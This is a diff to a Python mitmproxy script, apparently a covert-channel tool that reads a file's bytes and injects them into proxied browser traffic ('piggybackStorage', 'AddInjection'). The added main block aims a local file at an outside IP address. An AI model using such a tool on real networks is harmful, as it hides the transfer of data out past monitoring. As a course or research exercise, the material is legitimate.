@@ -1,4 +1,5 @@
 #! python
+from django.http import HttpResponse
 from mitmproxy.options import Options
 from mitmproxy.tools.dump import DumpMaster
 from mitmproxy import http
@@ -44,11 +45,11 @@ class AddInjection(object):
             
             self.index += 1
             flow.resume()
-        
+
 # configure proxy settings
 def config_proxy()->DumpMaster:
     """Configures mitmproxy on specific port and address."""
-    opts = Options(listen_host='127.0.0.1',listen_port=8080) 
+    opts = Options(listen_host='127.0.0.1',listen_port=8081) 
     server = DumpMaster(opts)
     return server
 
@@ -61,10 +62,10 @@ def piggybackStorage(ip:str,port:int,fp:str)->None:
     input = []
     
     #get file
-    with open(fp,'r',encoding='utf-8-sig') as f:
+    with open(fp,'rb') as f:
         for line in f:
             for c in line:
-                input.append(ord(c))
+                input.append(c)
     input.append(999)
     
     # configurations
@@ -73,14 +74,11 @@ def piggybackStorage(ip:str,port:int,fp:str)->None:
     browser.set()
     # start proxying!
 
-    def startprox():
-        print("[!] Starting Proxy")
-        prox.run()
-        print("[!] Proxy Stopped")
-        browser.release()
+    print("[!] Starting Proxy")
+    prox.run()
+    print("[!] Proxy Stopped")
+    browser.release()
 
-    try:
-        startprox()
-    except:
-        startprox()
-        
+if __name__ == "__main__":
+    piggybackStorage('138.47.131.106',8081,'rainbow.png')
+    
